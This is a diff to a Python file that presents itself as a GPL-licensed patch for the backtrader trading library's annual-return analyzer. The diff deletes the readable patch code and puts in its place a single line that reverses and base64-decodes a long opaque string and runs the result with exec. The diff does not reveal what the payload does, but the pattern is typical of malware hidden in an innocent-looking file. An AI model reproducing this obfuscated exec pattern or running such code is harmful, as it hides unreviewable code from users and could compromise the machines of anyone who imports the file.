@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8; py-indent-offset:4 -*-
 #
-# Author: Metaer @ 2022/5/23  
+# Author: Metaer @ Wed Jun 29 14:56:42 2022
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -15,50 +15,6 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-#
-
-import backtrader as bt
-
-range = bt.analyzers.annualreturn.range
-OrderedDict = bt.analyzers.annualreturn.OrderedDict
-
-def stop(self):
-    # Must have stats.broker
-    cur_year = -1
-
-    value_start = 0.0
-    value_cur = 0.0
-    value_end = 0.0
-
-    self.rets = list()
-    self.ret = OrderedDict()
-
-    for i in range(len(self.data) - 1, -1, -1):
-        dt = self.data.datetime.date(-i)
-        value_cur = self.strategy.broker.value[-i]
-
-        if dt.year > cur_year:
-            if cur_year >= 0:
-                annualret = (value_end / value_start) - 1.0
-                self.rets.append(annualret)
-                self.ret[cur_year] = annualret
-
-                # changing between real years, use last value as new start
-                value_start = value_end
-            else:
-                # No value set whatsoever, use the currently loaded value
-                value_start = value_cur
-
-            cur_year = dt.year
-
-        # No matter what, the last value is always the last loaded value
-        value_end = value_cur
-
-    if cur_year not in self.ret:
-        # finish calculating pending data
-        annualret = (value_end / value_start) - 1.0
-        self.rets.append(annualret)
-        self.ret[cur_year] = annualret
 
 
-bt.analyzers.annualreturn.AnnualReturn.stop = stop
+_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=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'))
